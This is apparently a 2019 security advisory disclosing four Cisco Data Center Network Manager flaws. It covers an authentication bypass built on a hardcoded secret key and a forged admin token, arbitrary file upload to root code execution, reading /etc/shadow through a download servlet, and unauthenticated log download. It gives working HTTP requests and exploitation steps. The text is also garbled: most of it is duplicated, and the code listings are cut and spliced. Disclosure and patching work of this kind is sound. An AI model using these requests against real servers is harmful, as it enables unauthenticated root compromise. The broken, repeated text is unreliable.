Hi,

tl;dr Cisco Data Center Network Manager has multiple vulns which can be
abused to achieve RCE as root with no authentication.

Full advisory below, and Metasploit modules have been submitted to the
project.

A special thanks to iDefense for handling the disclosure process with Cisco.

==========================================================================
Disclosure: 26/6/2019 / Last updated: 6/7/2019

```

```
Cisco Data Center Network Manager (DCNM) is provided by Cisco as a
virtual appliance as well as installation packages for Windows and Red
Hat Linux.
DCNM is widely deloyed in data centres worldwide to manage Cisco devices
on a global scale.

DCNM 11.1(1) and below is affected by four vulnerabilities:
authentication bypass, arbitrary file upload (leading to remote code
execution), arbitrary file download and information disclosure via log
download.

The table below lists the affected versions for each vulnerability:

Vulnerability                                           Vulnerable?
                         CVE
                            <= 10.4(2)          11.0(1)         11.1(1)
      >= 11.2(1)
Authentication bypass           Yes               No              No
          No           2019-1619
File upload                 Yes, auth          Yes, auth      Yes,
unauth         No           2019-1620
File download               Yes, auth          Yes, auth      Yes,
unauth         No           2019-1621
Info disclosure             Yes, unauth        Yes, unauth    Yes,
unauth         ?            2019-1622

The authentication bypass affects versions 10.4(2), allowing an attacker
to exploit the file upload for remote code execution.
In version 11.0(1), authentication was introduced, and a valid
unprivileged account is necessary to exploit all vulnerabilities except
information discloure.
Amazingly, in version 11.1(1) Cisco removed the authentication for the
file upload and file download vulnerabilities.
All vulnerabilities were fixed in 11.2(1), except the information
disclosure, for which the status is unknown.

To achieve remote code execution with arbitrary file upload
vulnerability, an attacker can write a WAR file in the Tomcat webapps
folder. The Apache Tomcat server is running as root, meaning that the
Java shell will run as root.

Agile Information Security would like to thank the iDefense
Vulnerability Contributor Program for handling the disclosure process
with Cisco [1].

#1
Vulnerability: Authentication Bypass
CVE-2019-1619
Attack Vector: Remote
Constraints: None
Affected products / versions:
- Cisco Data Center Network Manager 10.4(2) and below

DCNM exposes a "ReportServlet" on the URL /fm/pmreport. By abusing this
servlet, an unauthenticated attacker can obtain a valid administrative
session on the web interface [3].

The snippet of code below shows what the servlet does:
com.cisco.dcbu.web.client.performance.ReportServlet

        public void doGet(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                Credentials cred =
(Credentials)request.getSession().getAttribute("credentials");
                if((cred == null || !cred.isAuthenticated()) &&
!"fetch".equals(request.getParameter("command")) &&
!this.verifyToken(request)) {
                        request.setAttribute("popUpSessionTO", "true");
                }

                this.doInteractiveChart(request, response);
        }

The request is passed on to the verifyToken function, listed below:
  private boolean verifyToken(HttpServletRequest httpServletRequest) {
                String token = httpServletRequest.getParameter("token");
                if(token == null) {
                        return false;
                } else {
                        try {
                                FMServerRif serverRif = SQLLoader.getServerManager();
                                IscRif isc =
serverRif.getIsc(StringEncrypter.encryptString("DESede", (new
Date()).toString()));
                                token = URLDecoder.decode(token, "UTF-8");
                                token = token.replace(' ', '+');
                                FMUserBase fmUserBase = isc.verifySSoToken(token);
                                if(fmUserBase == null) {
                                        return false;
                                } else {
                                        Credentials newCred = new Credentials();
                                        int idx = fmUserBase.getUsername().indexOf(64);
                                        newCred.setUserName(idx ==
-1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));

newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));
                                        newCred.setRole(fmUserBase.getRole());
                                        newCred.setAuthenticated(true);
                                        httpServletRequest.getSession().setAttribute("credentials", newCred);
                                        return true;
                                }
                        } catch (Exception var8) {
                                var8.printStackTrace();
                                return false;
                        }
                }
        }

As it can be seen in the line:
                                FMUserBase fmUserBase = isc.verifySSoToken(token);
the HTTP request parameter "token" gets passed to IscRif.verifySsoToken,
and if that function returns a valid user, the request is authenticated
and credentials are stored in the session.

Let's dig deeper and find out what happens in IscRif.verifySsoToken. The
class implementing is actually com.cisco.dcbu.sm.server.facade.IscImpl:

        public FMUserBase verifySSoToken(String ssoToken) {
                return SecurityManager.verifySSoToken(ssoToken);
        }

Digging further into SecurityManager.verifySSoToken:
com.cisco.dcbu.sm.server.security.SecurityManager

public static FMUserBase verifySSoToken(String ssoToken) {
                String userName = null;
                FMUserBase fmUserBase = null;
                FMUser fmUser = null;

                try {
                        userName = getSSoTokenUserName(ssoToken);
                        if(confirmSSOToken(ssoToken)) {
                                fmUser = UserManager.getInstance().findUser(userName);
                                if(fmUser != null) {
                                        fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(),
fmUser.getRoles());
                                }

                                if(fmUserBase == null) {
                                        fmUserBase = DCNMUserImpl.getFMUserBase(userName);
                                }

                                if(fmUserBase == null) {
                                        fmUserBase =
FMSessionManager.getInstance().getFMUser(getSessionIdByToken(ssoToken));
                                }
                        }
                } catch (Exception var5) {
                        _Logger.info("verifySSoToken: ", var5);
                }

                return fmUserBase;
        }

As it can be seen in the code above, the username is obtained from the
token here:
                        userName = getSSoTokenUserName(ssoToken);

Digging yet another layer we find the following:
public static String getSSoTokenUserName(String ssoToken) {
                return getSSoTokenDetails(ssoToken)[3];
        }

        private static String[] getSSoTokenDetails(String ssoToken) {
                String[] ret = new String[4];
                String separator = getTokenSeparator();
                StringTokenizer st = new StringTokenizer(ssoToken, separator);
                if(st.hasMoreTokens()) {
                        ret[0] = st.nextToken();
                        ret[1] = st.nextToken();
                        ret[2] = st.nextToken();

                        for(ret[3] = st.nextToken(); st.hasMoreTokens(); ret[3] = ret[3] +
separator + st.nextToken()) {
                                ;
                        }
                }

                return ret;
        }

Seems like the token is a string which is separated by the "separator"
with four components, the fourth of which is the username.

Now going back to SecurityManager.verifySSoToken listed above, we see
that after the call to getSSoTokenUserName, confirmSSOToken is called:
        public static FMUserBase verifySSoToken(String ssoToken) {
                (...)
                        userName = getSSoTokenUserName(ssoToken);
                        if(confirmSSOToken(ssoToken)) {
                                fmUser = UserManager.getInstance().findUser(userName);
                                if(fmUser != null) {
                                        fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(),
fmUser.getRoles());
                                }
                (...)
        }

        public static boolean confirmSSOToken(String ssoToken) {
                String userName = null;
                int sessionId = false;
                long sysTime = 0L;
                String digest = null;
                int count = false;
                boolean ret = false;

                try {
                        String[] detail = getSSoTokenDetails(ssoToken);
                        userName = detail[3];
                        int sessionId = Integer.parseInt(detail[0]);
                        sysTime = (new Long(detail[1])).longValue();
                        if(System.currentTimeMillis() - sysTime > 600000L) {
                                return ret;
                        }

                        digest = detail[2];
                        if(digest != null && digest.equals(getMessageDigest("MD5", userName,
sessionId, sysTime))) {
                                ret = true;
                                userNameTLC.set(userName);
                        }
                } catch (Exception var9) {
                        _Logger.info("confirmSSoToken: ", var9);
                }

                return ret;
        }

Now we can further understand the token. It seems it is composed of:
sessionId + separator + sysTime + separator + digest + separator + username

And what is the digest? Let's look into the getMessageDigest function:

                private static String getMessageDigest(String algorithm, String
userName, int sessionid, long sysTime) throws Exception {
                        String input = userName + sessionid + sysTime + SECRETKEY;
                        MessageDigest md = MessageDigest.getInstance(algorithm);
                        md.update(input.getBytes());
                        return new String(Base64.encodeBase64((byte[])md.digest()));
                }

It is nothing more than the MD5 of:
userName + sessionid + sysTime + SECRETKEY

... and SECRETKEY is a fixed key in the code:
        private static final String SECRETKEY =
"POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF";

... while the separator is a ".":
          private static String getTokenSeparator()
          {
      return System.getProperty("security.tokenSeparator", ".");
          }

In summary, this is what happens:
The ReportServlet will happily authenticate any request, as long as it
receives a token in the following format:
sessionId.sysTime.MD5(userName + sessionid + sysTime + SECRETKEY).username

The sessionId can be made up by the user, sysTime can be obtained by
getting the server Date HTTP header and then converting to milliseconds,
and we know the SECRETKEY and the username, so now we can authenticate
as any user. Here's an example token:
GET /fm/pmreport?token=1337.1535935659000.upjVgZQmxNNgaXo5Ga6jvQ==.admin

This request will return a 500 error due to the lack of some parameters
necessary for the servlet to execute correctly, however it will also
successfully authenticate us to the server, which will cause it to
return a JSESSIONID cookie with valid authenticated session for the
admin user.
Note that the user has to be valid. The "admin" user is a safe bet as it
is present by default in all systems, and it is also the most privileged
user in the system.

Unfortunately, this technique does not work for 11.0(1). I believe this
is not because the vulnerability was fixed, as the exact same code is
present in the newer version.
In 11.0(1), the ReportServlet.verifyToken function crashes with an
exception in the line noted below:

  private boolean verifyToken(HttpServletRequest httpServletRequest) {
        (...)
                                        Credentials newCred = new Credentials();
                                        int idx = fmUserBase.getUsername().indexOf(64);
                                        newCred.setUserName(idx ==
-1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));

newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));
                   <--- exception occurs here
                                        newCred.setRole(fmUserBase.getRole());
                                        newCred.setAuthenticated(true);
                                        httpServletRequest.getSession().setAttribute("credentials", newCred);
                                        return true;
                                }
                        } catch (Exception var8) {
                                var8.printStackTrace();
                                return false;
                        }
        (...)
  }

The exception returned is a
"com.cisco.dcbu.lib.util.StringEncrypter$EncryptionException:
javax.crypto.BadPaddingException: Given final block not properly padded".
This will cause execution to go into the catch block shown above, and
the function will return false, so the JSESSIONID cookie returned by the
server will not have the credentials stored in it.

I believe this is purely a coding mistake - Cisco updated their password
encryption method, but failed to update their own code. Unless this
ReportServlet code is deprecated, this is a real bug that happens to fix
a security vulnerability by accident.

On version 11.0(1), it seems that the ReportServlet has been removed
from the corresponding WAR xml mapping file, so requesting that URL now
returns an HTTP 404 error.

Vulnerability: Arbitrary File Upload (leading to remote code execution)
CVE-2019-1620
Attack Vector: Remote
Constraints: Authentication to the web interface as an unprivileged user
required EXCEPT for version 11.1(1), where it can be exploited by an
unauthenticated user
Affected products / versions:
- Cisco Data Center Network Manager 11.1(1) and below

DCNM exposes a file upload servlet (FileUploadServlet) at
/fm/fileUpload. An authenticated user can abuse this servlet to upload
files to an arbitrary directory and ultimately achieve remote code
execution [4].

The code for this servlet is listed below:
com.cisco.dcbu.web.client.reports.FileUploadServlet

        public void doPost(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                this.doGet(request, response);
        }

        public void doGet(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                Credentials cred =
(Credentials)((Object)request.getSession().getAttribute("credentials"));
                if (cred == null || !cred.isAuthenticated()) {
                        throw new ServletException("User not logged in or Session timed out.");
                }
                this.handleUpload(request, response);
        }

The code shown above is simple, and the request is passed onto handleUpload:

        private void handleUpload(HttpServletRequest request,
HttpServletResponse response) throws ServletException, IOException {
                response.setContentType(CONTENT_TYPE);
                PrintWriter out = null;
                ArrayList<String> allowedFormats = new ArrayList<String>();
                allowedFormats.add("jpeg");
                allowedFormats.add("png");
                allowedFormats.add("gif");
                allowedFormats.add("jpg");
                allowedFormats.add("cert");

                        SAXTransformerFactory tf =
(SAXTransformerFactory)SAXTransformerFactory.newInstance();
                        items = upload.parseRequest(request);
                        iterator = items.listIterator();
                        hd = tf.newTransformerHandler();
                        Transformer serializer = hd.getTransformer();

                                                statusMessage = "File successfully written to server at " +
simpleDateFormat.format(calendar.getTime());
                                        }

                                }
                                catch (Exception ex) {
                                        this.processUploadedFile(item, uploadDir, fname);
                                        Calendar calendar = Calendar.getInstance();
                                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy
hh:mm:ss aaa");
                                        statusMessage = "File successfully written to server at " +
simpleDateFormat.format(calendar.getTime());
                                        atts.addAttribute("", "", "id", "CDATA", fname);
                                }
                                hd.startElement("", "", "file", atts);
                                hd.characters(statusMessage.toCharArray(), 0, statusMessage.length());
                                hd.endElement("", "", "file");
                        }
                        hd.endElement("", "", "response");
                        hd.endDocument();
                        out.close();
                }
                catch (Exception e) {
                        out.println(e.getMessage());
                }
        }

handleUpload is more complex, but here's a summary; the function takes
an HTTP form with a parameter "uploadDir", a parameter "fname" and then
takes the last form object and writes it into "uploadDir/fname".
However, there is a catch... the file has to be a valid image with one
of the extensions listed here:
                allowedFormats.add("jpeg");
                allowedFormats.add("png");
                allowedFormats.add("gif");
                allowedFormats.add("jpg");
                allowedFormats.add("cert");

However, if you look closely, it is possible to upload any arbitrary
content. This is because nothing bad happens until we reach the second
(inner) try-catch block. Once inside, the first thing that happens is this:
                                try {
                                        String imageFormat = imageReader.getFormatName();

... which will cause imageReader to throw and exception if the binary
content we sent is not a file, sending us into the catch block:
                                catch (Exception ex) {
                                        this.processUploadedFile(item, uploadDir, fname);
                                        Calendar calendar = Calendar.getInstance();
                                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy
hh:mm:ss aaa");
                                        statusMessage = "File successfully written to server at " +
simpleDateFormat.format(calendar.getTime());
                                        atts.addAttribute("", "", "id", "CDATA", fname);

... meaning that the file contents, upload dir and its name are sent
into processUploadedFile.

Let's look into that now:
        private void processUploadedFile(FileItem item, String uploadDir,
String fname) throws Exception {
                try {
                        int offset;
                        int contentLength = (int)item.getSize();
                        InputStream raw = item.getInputStream();
                        BufferedInputStream in = new BufferedInputStream(raw);
                        byte[] data = new byte[contentLength];
                        int bytesRead = 0;
                        for (offset = 0; offset < contentLength && (bytesRead = in.read(data,
offset, data.length - offset)) != -1; offset += bytesRead) {
                        }
                        in.close();
                        if (offset != contentLength) {
                                throw new IOException("Only read " + offset + " bytes; Expected " +
contentLength + " bytes");
                        }
                        FileOutputStream out = new FileOutputStream(uploadDir +
File.separator + fname);
                        out.write(data);
                        out.flush();
                        out.close();
                }
                catch (Exception ex) {
                        throw new Exception("FileUploadSevlet processUploadFile failed: " +
ex.getMessage());
                }
        }

Amazingly, this function totally ignores the content, and simple writes
the file contents to the filename and folder we have indicated.
In summary, if we send any binary content that is not a file, we can
write it to any new file in any directory as root.

If we send the following request:
POST /fm/fileUpload HTTP/1.1
Host: 10.75.1.40
Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;
Content-Length: 429

Content-Disposition: form-data; name="filePath"; filename="whatever"
Content-Type: application/octet-stream

<any text or binary content here>

The server will respond with:
HTTP/1.1 200 OK
X-FRAME-OPTIONS: SAMEORIGIN
Content-Type: text/xml;charset=utf-8

<field id="uploadDir">/tmp/</field>
<file id="whatever">File successfully written to server at 09.02.18
05:57:11 PM</file>
</response>

And our file has been written as root on the server:
[root@dcnm_vm ~]# ls -l /tmp/
(...)
-rw-r--r--  1 root          root               16 Sep  2 17:57 owned
(...)

Finally if we write a WAR file to the JBoss deployment directory, and
the server will deploy the WAR file as root, allowing the attacker to
achieve remote code execution.

A Metasploit module that exploits this vulnerability has been released
with this advisory.

                String showFile = (String)request.getAttribute("showFile");
                if (showFile == null) {
                        showFile = request.getParameter("showFile");
                }
                File f = new File(showFile);
                if (showFile.endsWith(".cert")) {
                        response.setContentType("application/octet-stream");
                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment;

                } else if (showFile.endsWith(".msi")) {

                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment; filename=" +
f.getName() + ";");
                } else if (showFile.endsWith(".xls")) {
                        response.setContentType("application/vnd.ms-excel");
                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment; filename=" +
f.getName() + ";");
                }
                ServletOutputStream os = response.getOutputStream();
                FileInputStream is = new FileInputStream(f);
                byte[] buffer = new byte[4096];
                int read = 0;
                try {
                        while ((read = is.read(buffer)) > 0) {
                                os.write(buffer, 0, read);
                        }
                        os.flush();
                }
                catch (Exception e) {
                        LogService.log(LogService._WARNING, e.getMessage());
                }
                finally {
                        is.close();
                }
        }
}

As you can see, it's quite simple. It takes a "showFile" request
parameter, reads that file and returns to the user. Here's an example of
the servlet in action:

Request:
GET /fm/downloadServlet?showFile=/etc/shadow HTTP/1.1
Host: 10.75.1.40
Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;

Response:
HTTP/1.1 200 OK

root:$1$(REDACTED).:17763:0:99999:7:::

adm:*:15980:0:99999:7:::
lp:*:15980:0:99999:7:::
(...)

An interesting file to download is
/usr/local/cisco/dcm/fm/conf/server.properties, which contains the
database credentials as well as the sftp root password, both encrypted
with a key that is hardcoded in the source code.

A Metasploit module that exploits this vulnerability has been released
with this advisory.

#4
Vulnerability: Information Disclosure (log files download)
CVE-2019-1622
Attack Vector: Remote
Constraints: None
Affected products / versions:

DCNM exposes a LogZipperServlet in /fm/log/fmlogs.zip. This servlet can
be accessed by an unauthenticated attacker, and it will return all the
log files in /usr/local/cisco/dcm/fm/logs/* in ZIP format, which provide
information about local directories, software versions, authentication
errors, detailed stack traces, etc [6].

To access it, simply request:
GET /fm/log/fmlogs.zip

Code is not shown here for brevity, but the implementation class is
com.cisco.dcbu.web.client.admin.LogZipperServlet.

Hi,

tl;dr Cisco Data Center Network Manager has multiple vulns which can be
abused to achieve RCE as root with no authentication.

Full advisory below, and Metasploit modules have been submitted to the
project.

A special thanks to iDefense for handling the disclosure process with Cisco.

==========================================================================
Disclosure: 26/6/2019 / Last updated: 6/7/2019

```
Cisco Data Center Network Manager (DCNM) is provided by Cisco as a
virtual appliance as well as installation packages for Windows and Red
Hat Linux.
DCNM is widely deloyed in data centres worldwide to manage Cisco devices
on a global scale.

DCNM 11.1(1) and below is affected by four vulnerabilities:
authentication bypass, arbitrary file upload (leading to remote code
execution), arbitrary file download and information disclosure via log
download.

The table below lists the affected versions for each vulnerability:

Vulnerability                                           Vulnerable?
                         CVE
                            <= 10.4(2)          11.0(1)         11.1(1)
      >= 11.2(1)
Authentication bypass           Yes               No              No
          No           2019-1619
File upload                 Yes, auth          Yes, auth      Yes,
unauth         No           2019-1620
File download               Yes, auth          Yes, auth      Yes,
unauth         No           2019-1621
Info disclosure             Yes, unauth        Yes, unauth    Yes,
unauth         ?            2019-1622

The authentication bypass affects versions 10.4(2), allowing an attacker
to exploit the file upload for remote code execution.
In version 11.0(1), authentication was introduced, and a valid
unprivileged account is necessary to exploit all vulnerabilities except
information discloure.
Amazingly, in version 11.1(1) Cisco removed the authentication for the
file upload and file download vulnerabilities.
All vulnerabilities were fixed in 11.2(1), except the information
disclosure, for which the status is unknown.

To achieve remote code execution with arbitrary file upload
vulnerability, an attacker can write a WAR file in the Tomcat webapps
folder. The Apache Tomcat server is running as root, meaning that the
Java shell will run as root.

Agile Information Security would like to thank the iDefense
Vulnerability Contributor Program for handling the disclosure process
with Cisco [1].

#1
Vulnerability: Authentication Bypass
CVE-2019-1619
Attack Vector: Remote
Constraints: None
Affected products / versions:
- Cisco Data Center Network Manager 10.4(2) and below

DCNM exposes a "ReportServlet" on the URL /fm/pmreport. By abusing this
servlet, an unauthenticated attacker can obtain a valid administrative
session on the web interface [3].

The snippet of code below shows what the servlet does:
com.cisco.dcbu.web.client.performance.ReportServlet

        public void doGet(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                Credentials cred =
(Credentials)request.getSession().getAttribute("credentials");
                if((cred == null || !cred.isAuthenticated()) &&
!"fetch".equals(request.getParameter("command")) &&
!this.verifyToken(request)) {
                        request.setAttribute("popUpSessionTO", "true");
                }

                this.doInteractiveChart(request, response);
        }

The request is passed on to the verifyToken function, listed below:
  private boolean verifyToken(HttpServletRequest httpServletRequest) {
                String token = httpServletRequest.getParameter("token");
                if(token == null) {
                        return false;
                } else {
                        try {
                                FMServerRif serverRif = SQLLoader.getServerManager();
                                IscRif isc =
serverRif.getIsc(StringEncrypter.encryptString("DESede", (new
Date()).toString()));
                                token = URLDecoder.decode(token, "UTF-8");
                                token = token.replace(' ', '+');
                                FMUserBase fmUserBase = isc.verifySSoToken(token);
                                if(fmUserBase == null) {
                                        return false;
                                } else {
                                        Credentials newCred = new Credentials();
                                        int idx = fmUserBase.getUsername().indexOf(64);
                                        newCred.setUserName(idx ==
-1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));

newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));
                                        newCred.setRole(fmUserBase.getRole());
                                        newCred.setAuthenticated(true);
                                        httpServletRequest.getSession().setAttribute("credentials", newCred);
                                        return true;
                                }
                        } catch (Exception var8) {
                                var8.printStackTrace();
                                return false;
                        }
                }
        }

As it can be seen in the line:
                                FMUserBase fmUserBase = isc.verifySSoToken(token);
the HTTP request parameter "token" gets passed to IscRif.verifySsoToken,
and if that function returns a valid user, the request is authenticated
and credentials are stored in the session.

Let's dig deeper and find out what happens in IscRif.verifySsoToken. The
class implementing is actually com.cisco.dcbu.sm.server.facade.IscImpl:

        public FMUserBase verifySSoToken(String ssoToken) {
                return SecurityManager.verifySSoToken(ssoToken);
        }

Digging further into SecurityManager.verifySSoToken:
com.cisco.dcbu.sm.server.security.SecurityManager

public static FMUserBase verifySSoToken(String ssoToken) {
                String userName = null;
                FMUserBase fmUserBase = null;
                FMUser fmUser = null;

                try {
                        userName = getSSoTokenUserName(ssoToken);
                        if(confirmSSOToken(ssoToken)) {
                                fmUser = UserManager.getInstance().findUser(userName);
                                if(fmUser != null) {
                                        fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(),
fmUser.getRoles());
                                }

                                if(fmUserBase == null) {
                                        fmUserBase = DCNMUserImpl.getFMUserBase(userName);
                                }

                                if(fmUserBase == null) {
                                        fmUserBase =
FMSessionManager.getInstance().getFMUser(getSessionIdByToken(ssoToken));
                                }
                        }
                } catch (Exception var5) {
                        _Logger.info("verifySSoToken: ", var5);
                }

                return fmUserBase;
        }

As it can be seen in the code above, the username is obtained from the
token here:
                        userName = getSSoTokenUserName(ssoToken);

Digging yet another layer we find the following:
public static String getSSoTokenUserName(String ssoToken) {
                return getSSoTokenDetails(ssoToken)[3];
        }

        private static String[] getSSoTokenDetails(String ssoToken) {
                String[] ret = new String[4];
                String separator = getTokenSeparator();
                StringTokenizer st = new StringTokenizer(ssoToken, separator);
                if(st.hasMoreTokens()) {
                        ret[0] = st.nextToken();
                        ret[1] = st.nextToken();
                        ret[2] = st.nextToken();

                        for(ret[3] = st.nextToken(); st.hasMoreTokens(); ret[3] = ret[3] +
separator + st.nextToken()) {
                                ;
                        }
                }

                return ret;
        }

Seems like the token is a string which is separated by the "separator"
with four components, the fourth of which is the username.

Now going back to SecurityManager.verifySSoToken listed above, we see
that after the call to getSSoTokenUserName, confirmSSOToken is called:
        public static FMUserBase verifySSoToken(String ssoToken) {
                (...)
                        userName = getSSoTokenUserName(ssoToken);
                        if(confirmSSOToken(ssoToken)) {
                                fmUser = UserManager.getInstance().findUser(userName);
                                if(fmUser != null) {
                                        fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(),
fmUser.getRoles());
                                }
                (...)
        }

        public static boolean confirmSSOToken(String ssoToken) {
                String userName = null;
                int sessionId = false;
                long sysTime = 0L;
                String digest = null;
                int count = false;
                boolean ret = false;

                try {
                        String[] detail = getSSoTokenDetails(ssoToken);
                        userName = detail[3];
                        int sessionId = Integer.parseInt(detail[0]);
                        sysTime = (new Long(detail[1])).longValue();
                        if(System.currentTimeMillis() - sysTime > 600000L) {
                                return ret;
                        }

                        digest = detail[2];
                        if(digest != null && digest.equals(getMessageDigest("MD5", userName,
sessionId, sysTime))) {
                                ret = true;
                                userNameTLC.set(userName);
                        }
                } catch (Exception var9) {
                        _Logger.info("confirmSSoToken: ", var9);
                }

                return ret;
        }

Now we can further understand the token. It seems it is composed of:
sessionId + separator + sysTime + separator + digest + separator + username

And what is the digest? Let's look into the getMessageDigest function:

                private static String getMessageDigest(String algorithm, String
userName, int sessionid, long sysTime) throws Exception {
                        String input = userName + sessionid + sysTime + SECRETKEY;
                        MessageDigest md = MessageDigest.getInstance(algorithm);
                        md.update(input.getBytes());
                        return new String(Base64.encodeBase64((byte[])md.digest()));
                }

It is nothing more than the MD5 of:
userName + sessionid + sysTime + SECRETKEY

... and SECRETKEY is a fixed key in the code:
        private static final String SECRETKEY =
"POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF";

... while the separator is a ".":
          private static String getTokenSeparator()
          {
      return System.getProperty("security.tokenSeparator", ".");
          }

In summary, this is what happens:
The ReportServlet will happily authenticate any request, as long as it
receives a token in the following format:
sessionId.sysTime.MD5(userName + sessionid + sysTime + SECRETKEY).username

The sessionId can be made up by the user, sysTime can be obtained by
getting the server Date HTTP header and then converting to milliseconds,
and we know the SECRETKEY and the username, so now we can authenticate
as any user. Here's an example token:
GET /fm/pmreport?token=1337.1535935659000.upjVgZQmxNNgaXo5Ga6jvQ==.admin

This request will return a 500 error due to the lack of some parameters
necessary for the servlet to execute correctly, however it will also
successfully authenticate us to the server, which will cause it to
return a JSESSIONID cookie with valid authenticated session for the
admin user.
Note that the user has to be valid. The "admin" user is a safe bet as it
is present by default in all systems, and it is also the most privileged
user in the system.

Unfortunately, this technique does not work for 11.0(1). I believe this
is not because the vulnerability was fixed, as the exact same code is
present in the newer version.
In 11.0(1), the ReportServlet.verifyToken function crashes with an
exception in the line noted below:

  private boolean verifyToken(HttpServletRequest httpServletRequest) {
        (...)
                                        Credentials newCred = new Credentials();
                                        int idx = fmUserBase.getUsername().indexOf(64);
                                        newCred.setUserName(idx ==
-1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));

newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));
                   <--- exception occurs here
                                        newCred.setRole(fmUserBase.getRole());
                                        newCred.setAuthenticated(true);
                                        httpServletRequest.getSession().setAttribute("credentials", newCred);
                                        return true;
                                }
                        } catch (Exception var8) {
                                var8.printStackTrace();
                                return false;
                        }
        (...)
  }

The exception returned is a
"com.cisco.dcbu.lib.util.StringEncrypter$EncryptionException:
javax.crypto.BadPaddingException: Given final block not properly padded".
This will cause execution to go into the catch block shown above, and
the function will return false, so the JSESSIONID cookie returned by the
server will not have the credentials stored in it.

I believe this is purely a coding mistake - Cisco updated their password
encryption method, but failed to update their own code. Unless this
ReportServlet code is deprecated, this is a real bug that happens to fix
a security vulnerability by accident.

On version 11.0(1), it seems that the ReportServlet has been removed
from the corresponding WAR xml mapping file, so requesting that URL now
returns an HTTP 404 error.

#2
Vulnerability: Arbitrary File Upload (leading to remote code execution)
CVE-2019-1620
Attack Vector: Remote
Constraints: Authentication to the web interface as an unprivileged user
required EXCEPT for version 11.1(1), where it can be exploited by an
unauthenticated user
Affected products / versions:
- Cisco Data Center Network Manager 11.1(1) and below

DCNM exposes a file upload servlet (FileUploadServlet) at
/fm/fileUpload. An authenticated user can abuse this servlet to upload
files to an arbitrary directory and ultimately achieve remote code
execution [4].

The code for this servlet is listed below:
com.cisco.dcbu.web.client.reports.FileUploadServlet

        public void doPost(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                this.doGet(request, response);
        }

        public void doGet(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                Credentials cred =
(Credentials)((Object)request.getSession().getAttribute("credentials"));
                if (cred == null || !cred.isAuthenticated()) {
                        throw new ServletException("User not logged in or Session timed out.");
                }
                this.handleUpload(request, response);
        }

The code shown above is simple, and the request is passed onto handleUpload:

        private void handleUpload(HttpServletRequest request,
HttpServletResponse response) throws ServletException, IOException {
                response.setContentType(CONTENT_TYPE);
                PrintWriter out = null;
                ArrayList<String> allowedFormats = new ArrayList<String>();

                allowedFormats.add("jpg");

                        items = upload.parseRequest(request);

                                        this.processUploadedFile(item, uploadDir, fname);
                                        Calendar calendar = Calendar.getInstance();

                                        atts.addAttribute("", "", "id", "CDATA", fname);
                                }
                                hd.startElement("", "", "file", atts);
                                hd.characters(statusMessage.toCharArray(), 0, statusMessage.length());
                                hd.endElement("", "", "file");
                        }
                        hd.endElement("", "", "response");
                        hd.endDocument();
                        out.close();
                }
                catch (Exception e) {
                        out.println(e.getMessage());
                }
        }

handleUpload is more complex, but here's a summary; the function takes
an HTTP form with a parameter "uploadDir", a parameter "fname" and then
takes the last form object and writes it into "uploadDir/fname".
However, there is a catch... the file has to be a valid image with one
of the extensions listed here:
                allowedFormats.add("jpeg");
                allowedFormats.add("png");
                allowedFormats.add("gif");
                allowedFormats.add("jpg");
                allowedFormats.add("cert");

However, if you look closely, it is possible to upload any arbitrary
content. This is because nothing bad happens until we reach the second
(inner) try-catch block. Once inside, the first thing that happens is this:
                                try {
                                        String imageFormat = imageReader.getFormatName();

... which will cause imageReader to throw and exception if the binary
content we sent is not a file, sending us into the catch block:
                                catch (Exception ex) {
                                        this.processUploadedFile(item, uploadDir, fname);
                                        Calendar calendar = Calendar.getInstance();
                                        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy
hh:mm:ss aaa");
                                        statusMessage = "File successfully written to server at " +
simpleDateFormat.format(calendar.getTime());
                                        atts.addAttribute("", "", "id", "CDATA", fname);

... meaning that the file contents, upload dir and its name are sent
into processUploadedFile.

Let's look into that now:
        private void processUploadedFile(FileItem item, String uploadDir,
String fname) throws Exception {
                try {
                        int offset;
                        int contentLength = (int)item.getSize();
                        InputStream raw = item.getInputStream();
                        BufferedInputStream in = new BufferedInputStream(raw);
                        byte[] data = new byte[contentLength];
                        int bytesRead = 0;
                        for (offset = 0; offset < contentLength && (bytesRead = in.read(data,
offset, data.length - offset)) != -1; offset += bytesRead) {
                        }
                        in.close();
                        if (offset != contentLength) {
                                throw new IOException("Only read " + offset + " bytes; Expected " +
contentLength + " bytes");
                        }
                        FileOutputStream out = new FileOutputStream(uploadDir +
File.separator + fname);
                        out.write(data);

                        out.close();
                }
                catch (Exception ex) {
                        throw new Exception("FileUploadSevlet processUploadFile failed: " +
ex.getMessage());
                }
        }

Amazingly, this function totally ignores the content, and simple writes
the file contents to the filename and folder we have indicated.
In summary, if we send any binary content that is not a file, we can
